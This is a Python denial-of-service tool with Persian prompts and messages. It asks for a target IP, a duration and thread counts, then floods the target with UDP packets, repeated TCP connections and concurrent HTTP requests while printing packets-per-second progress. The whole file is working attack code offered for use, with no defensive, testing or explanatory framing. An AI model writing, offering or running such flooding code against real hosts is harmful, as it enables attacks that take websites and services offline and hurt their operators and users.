import socket
import threading
import random
import time
import requests
import asyncio
import aiohttp

stop_flag = threading.Event()
packets_sent = 0
lock = threading.Lock()

# UDP Flood
def udp_flood(target_ip, target_port, duration, packet_size):
    global packets_sent
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(packet_size)
    end_time = time.time() + duration
    while time.time() < end_time and not stop_flag.is_set():
        try:
            sock.sendto(data, (target_ip, target_port))
            with lock:
                packets_sent += 1
        except:
            pass
    sock.close()

# TCP SYN Flood (ساده شده)
def tcp_syn_flood(target_ip, target_port, duration):
    global packets_sent
    end_time = time.time() + duration
    while time.time() < end_time and not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((target_ip, target_port))
            sock.close()
            with lock:
                packets_sent += 1
        except:
            pass

# HTTP Flood با aiohttp
async def http_flood(session, url, duration):
    global packets_sent
    end_time = time.time() + duration
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    }
    while time.time() < end_time and not stop_flag.is_set():
        try:
            async with session.get(url, headers=headers) as response:
                with lock:
                    packets_sent += 1
        except:
            pass

async def run_http_flood(url, duration, concurrency):
    async with aiohttp.ClientSession() as session:
        tasks = [http_flood(session, url, duration) for _ in range(concurrency)]
        await asyncio.gather(*tasks)

def start_attack(target_ip, target_port=80, http_url=None, duration=60, udp_threads=50, tcp_threads=50, http_concurrency=50, packet_size=1024):
    global packets_sent
    packets_sent = 0
    stop_flag.clear()
    threads = []

    print(f"شروع حمله UDP Flood با {udp_threads} نخ به {target_ip}:{target_port}")
    for _ in range(udp_threads):
        t = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration, packet_size))
        t.daemon = True
        t.start()
        threads.append(t)

    print(f"شروع حمله TCP SYN Flood با {tcp_threads} نخ به {target_ip}:{target_port}")
    for _ in range(tcp_threads):
        t = threading.Thread(target=tcp_syn_flood, args=(target_ip, target_port, duration))
        t.daemon = True
        t.start()
        threads.append(t)

    if http_url:
        print(f"شروع حمله HTTP Flood به {http_url} با {http_concurrency} همزمانی")
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(run_http_flood(http_url, duration, http_concurrency))

    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            with lock:
                pps = packets_sent / elapsed if elapsed > 0 else 0
                print(f"بسته ارسال شده: {packets_sent} | سرعت: {pps:.2f} بسته بر ثانیه | زمان گذشته: {int(elapsed)} ثانیه", end='\r')
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nتوقف توسط کاربر درخواست شد.")
    stop_flag.set()
    for t in threads:
        t.join()
    print(f"\nحمله به پایان رسید. مجموع بسته‌های ارسال شده: {packets_sent}")

if __name__ == "__main__":
    target = input("آدرس IP هدف را وارد کنید: ").strip()
    duration = int(input("مدت زمان حمله به ثانیه (مثلاً 60): ").strip())
    udp_threads = int(input("تعداد نخ‌های UDP (مثلاً 50): ").strip())
    tcp_threads = int(input("تعداد نخ‌های TCP (مثلاً 50): ").strip())
    packet_size = int(input("حجم بسته UDP به بایت (مثلاً 1024): ").strip())
    http_url = input("آدرس کامل سایت برای حمله HTTP (خالی برای غیرفعال): ").strip()
    http_concurrency = int(input("تعداد همزمانی حمله HTTP (مثلاً 50): ").strip() if http_url else 0)

    start_attack(target, 80, http_url if http_url else None, duration, udp_threads, tcp_threads, http_concurrency, packet_size)
